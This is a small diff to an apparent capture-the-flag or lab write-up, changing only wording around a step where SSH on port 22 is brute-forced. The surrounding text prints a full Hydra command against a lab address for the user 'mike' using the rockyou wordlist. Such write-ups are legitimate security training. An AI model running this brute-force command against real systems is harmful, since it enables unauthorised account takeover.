@@ -14,7 +14,8 @@ we have two open ports
 
 let's start enumeration from port 22
 
-bruteforcing ssh with hydra gives password for the user mike
+so, bruteforcing ssh with hydra gives password for the user mike
+
 ```hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.150.150.166 ssh -t 4```
 ![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/1fc3d3b6-0184-44f7-b0fa-7f95d6569c2b)
 
